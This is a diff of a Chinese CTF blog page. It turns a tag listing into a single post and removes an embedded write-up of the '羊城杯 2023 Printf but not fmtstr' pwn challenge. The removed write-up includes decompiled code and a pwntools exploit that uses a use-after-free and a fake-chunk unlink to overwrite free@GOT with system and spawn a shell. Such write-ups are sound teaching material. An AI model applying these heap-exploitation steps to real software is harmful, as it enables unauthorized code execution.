@@ -5,7 +5,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	<meta name="description" content="">
 	<meta name="keywords" content="">
-	<title>unlink - My Blog</title>
+	<title>[SUCTF 2018 招新赛]unlink - My Blog</title>
     <link rel="alternate" href="" type="application/atom+xml"/>
 	<link rel="shortcut icon" href=""/>
 	
@@ -61,22 +61,15 @@
     </div>
 </header>
 
-        <div class="column-title fadeToTop">
-    <h3><span class="title-info">标签</span> unlink</h3>
-</div>
-
-<div class="con-wrap fadeToTop">
+        <div class="con-wrap fadeToTop">
     
     <section class="article-area">
     
-        
-            <article class="article">
+        <article class="article">
     <div class="article-wrap">
         
             <h2 class="article-title cl">
-                <a href="/2025/04/21/SUCTF-2018-招新赛-unlink/" title="[SUCTF 2018 招新赛]unlink">
-                    [SUCTF 2018 招新赛]unlink
-                </a>
+                [SUCTF 2018 招新赛]unlink
             </h2>
         
 
@@ -228,242 +221,33 @@ io.interactive()</code></pre>
 
         </div>
         
-            
         
         
-    </div>
-</article>
-
-        
-            <article class="article">
-    <div class="article-wrap">
-        
-            <h2 class="article-title cl">
-                <a href="/2025/04/21/羊城杯-2023-决赛-Printf-but-not-fmtstr/" title="[羊城杯 2023 决赛]Printf but not fmtstr">
-                    [羊城杯 2023 决赛]Printf but not fmtstr
-                </a>
-            </h2>
-        
-
-        <ul class="article-extra" style="margin-bottom: 20px">
-            
-            <li class="article-time">
-                2025-04-21
-            </li>
-            
-
-            
+        <div class="article-tags">
+            <ul class="tags-list cl">
                 
-            
-
-
-        </ul>
-        <div class="article-description">
-            
-            <p>题目glibc2.36 高版本带safe-linking 推断要泄露heap_base </p>
-<pre><code class="hljs plaintext">[*] &#x27;/home/rick/Downloads/attachment/pwn&#x27;
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      Canary found
-    NX:         NX enabled
-    PIE:        No PIE (0x3fe000)</code></pre>
-
-<p>64位 部分aslr 没有pie</p>
-<pre><code class="hljs C">FILE *<span class="hljs-title function_">sub_40127C</span><span class="hljs-params">()</span>
-&#123;
-  FILE *result; <span class="hljs-comment">// rax</span>
-
-  <span class="hljs-keyword">if</span> ( *(FILE **)off_404070 != <span class="hljs-built_in">stderr</span>
-    || *(FILE **)off_404078 != <span class="hljs-built_in">stdout</span>
-    || (result = <span class="hljs-built_in">stdin</span>, *(FILE **)off_404080 != <span class="hljs-built_in">stdin</span>) )
-  &#123;
-    write(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;No! you can&#x27;t do this!&quot;</span>, <span class="hljs-number">0x17u</span>LL);
-    _exit(<span class="hljs-number">0</span>);
-  &#125;
-  <span class="hljs-keyword">return</span> result;</code></pre>
-
-<p>有一个验证函数 检测是否修改了</p>
-<p>0x404070 -&gt; stderr</p>
-<p>0x404078 -&gt; stdout</p>
-<p>0x404080 -&gt; stdin </p>
-<p>这三个地址存放的这三个流的地址</p>
-<pre><code class="hljs C"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">add_notes</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span>
-&#123;
-  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span>
-  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span>
-  _DWORD size[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch] BYREF</span>
-
-  *(_QWORD *)&amp;size[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28u</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);
-  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v3);
-  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">0xF</span> )                              <span class="hljs-comment">// 最大只能存16个chunk</span>
-  &#123;
-    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: &quot;</span>);
-    __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, size);
-    <span class="hljs-keyword">if</span> ( size[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">0x900u</span> )
-    &#123;
-      <span class="hljs-comment">// 0x4FF&lt;size&lt;=0x900</span>
-      <span class="hljs-keyword">if</span> ( size[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0x4FFu</span> )
-      &#123;
-        v1 = v3;
-        qword_4040E0[v1] = <span class="hljs-built_in">malloc</span>(size[<span class="hljs-number">0</span>]);
-        dword_404160[v3] = size[<span class="hljs-number">0</span>];
-      &#125;
-      <span class="hljs-keyword">else</span>
-      &#123;
-        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Too small.&quot;</span>);
-      &#125;
-    &#125;
-    <span class="hljs-keyword">else</span>
-    &#123;
-      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Too big.&quot;</span>);
-    &#125;
-  &#125;
-  <span class="hljs-keyword">else</span>
-  &#123;
-    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages in this notebook.&quot;</span>);
-  &#125;
-  <span class="hljs-keyword">return</span> *(_QWORD *)&amp;size[<span class="hljs-number">1</span>] - __readfsqword(<span class="hljs-number">0x28u</span>);
-&#125;</code></pre>
-
-<p>只能存16个chunk</p>
-<p>最大0x900 最小0x4FF</p>
-<p>0x4040e0存的chunk地址</p>
-<p>0x404160存的chunk的size</p>
-<pre><code class="hljs C"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">delete_notes</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span>
-&#123;
-  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span>
-  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span>
-
-  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);
-  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v2);
-  <span class="hljs-keyword">if</span> ( v2 &lt;= <span class="hljs-number">0xF</span> )
-  &#123;
-    <span class="hljs-keyword">if</span> ( qword_4040E0[v2] )
-      <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)qword_4040E0[v2]);
-    <span class="hljs-keyword">else</span>
-      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Page not found.&quot;</span>);
-  &#125;
-  <span class="hljs-keyword">else</span>
-  &#123;
-    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages in this notebook.&quot;</span>);
-  &#125;
-  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28u</span>);
-&#125;</code></pre>
-
-<p>UAF 没有给指针置0</p>
-<pre><code class="hljs C"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">edit_notes</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span>
-&#123;
-  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span>
-  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span>
-
-  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);
-  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v2);
-  <span class="hljs-keyword">if</span> ( v2 &lt;= <span class="hljs-number">0xF</span> )
-  &#123;
-    <span class="hljs-keyword">if</span> ( qword_4040E0[v2] )
-    &#123;
-      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: &quot;</span>);
-      read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)qword_4040E0[v2], (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_404160[v2]);
-    &#125;
-    <span class="hljs-keyword">else</span>
-    &#123;
-      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Page not found.&quot;</span>);
-    &#125;
-  &#125;
-  <span class="hljs-keyword">else</span>
-  &#123;
-    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages in this notebook.&quot;</span>);
-  &#125;
-  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28u</span>);
-&#125;</code></pre>
-
-<p>用的是0x404160的size来填 如果改了这个size是不是可以溢出</p>
-<pre><code class="hljs C"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">show_notes</span><span class="hljs-params">()</span>
-&#123;
-  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span>
-  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span>
-
-  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);
-  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);
-  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);
-  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> )
-  &#123;
-    <span class="hljs-keyword">if</span> ( qword_4040E0[v1] )
-      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: %s\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)qword_4040E0[v1]);
-    <span class="hljs-keyword">else</span>
-      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Page not found.&quot;</span>);
-  &#125;
-  <span class="hljs-keyword">else</span>
-  &#123;
-    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages in this notebook.&quot;</span>);
-  &#125;
-  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28u</span>);
-&#125;</code></pre>
-
-<p>正常的show函数</p>
-<p>因为最小的chunk都大于0x410了 所以tcache肯定进不去了</p>
-<p>safe-linking只在tache</p>
-<p>接收:u64(p.recv(5).ljust(8,b’\x00’)) &lt;&lt; 12<br>而修改heap的fd指针:(heap_addr &gt;&gt; 12)^target_addr</p>
-<pre><code class="hljs python">new(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)
-new(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)
-new(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>)
-new(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)
-
-delete(<span class="hljs-number">0</span>)<span class="hljs-comment">##隔着放 要不然容易触发合并</span>
-delete(<span class="hljs-number">2</span>)
-
-show(<span class="hljs-number">0</span>)
-ru(<span class="hljs-string">b&quot;Content: &quot;</span>)
-leak_main_arena = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))
-ls(<span class="hljs-string">&quot;get_decrypted_main_arena=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(leak_main_arena))
-libc_base = leak_main_arena -libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdin_&quot;</span>] - <span class="hljs-number">0x200</span> -<span class="hljs-number">64</span>
-ls(<span class="hljs-string">&quot;get libc_base=&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))
-<span class="hljs-string">&#x27;&#x27;&#x27;</span>
-<span class="hljs-string">pwndbg&gt; x/40gx 0x718b2d7f6cc0 -0x200</span>
-<span class="hljs-string">0x718b2d7f6ac0 &lt;_IO_2_1_stdin_+64&gt;:	0x0000718b2d7f6b04	0x0000000000000000</span>
-<span class="hljs-string"></span>
-<span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre>
-
-<p>随便找的偏移 拿到libc_base</p>
-<blockquote>
-<p>[+] get_main_arena&#x3D;&gt;0x774ab4ff6cc0<br>[+] get libc_base&#x3D;&gt;0x774ab4e00000</p>
-</blockquote>
-<p>构造假chunk打unlink</p>
-<pre><code class="hljs python">delete(<span class="hljs-number">3</span>)<span class="hljs-comment">#触发合并 </span>
-new(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<span class="hljs-comment">#recovery idx 0 </span>
-new(<span class="hljs-number">6</span>,<span class="hljs-number">0x610</span>)<span class="hljs-comment">#cut chunk set idx 4 prev_size == 0x600</span>
-save_heap_addr = <span class="hljs-number">0x4040e0</span>
-has_bk = save_heap_addr
-has_fd = save_heap_addr +<span class="hljs-number">0x8</span>
-payload = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x601</span>)+p64(has_bk)+p64(has_fd)
-edit(<span class="hljs-number">3</span>,payload)<span class="hljs-comment">#现在可以发现块有了PREV_INUSE + FD BK改变 + next_chunk的prev_size 符合我们构造的fake_chunk</span>
-delete(<span class="hljs-number">4</span>)
-ogg = libc_base +<span class="hljs-number">0x4e1c9</span>
-edit(<span class="hljs-number">3</span>,p64(e.got[<span class="hljs-string">&quot;free&quot;</span>]))
-edit(<span class="hljs-number">0</span>,p64(libc_base+libc.sym[<span class="hljs-string">&quot;system&quot;</span>]))
-edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
-delete(<span class="hljs-number">2</span>)
-<span class="hljs-comment">#sla(b&quot;&gt;&quot;,str(1))</span>
-
-<span class="hljs-comment">#attach(io)</span></code></pre>
-
-<p>打完后才发现有后门，，</p>
-
+                <li><a href="/tags/heap/"><i class="fa fa-tag"></i>heap</a></li>
+                
+                <li><a href="/tags/pwn/"><i class="fa fa-tag"></i>pwn</a></li>
+                
+                <li><a href="/tags/unlink/"><i class="fa fa-tag"></i>unlink</a></li>
+                
+            </ul>
         </div>
         
-            
+        <div class="article-pagination cl">
         
+        
+            <div class="pagination-next">
+                <a href="/2025/04/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-%E5%86%B3%E8%B5%9B-Printf-but-not-fmtstr/">[羊城杯 2023 决赛]Printf but not fmtstr</a>
+            </div>
+        
+        </div>
+
         
     </div>
 </article>
 
-        
-        <ul class="pagination clear">
-    <span class="page-number current">1</span>
-</ul>
     </section>
     
 <section class="tool-area">
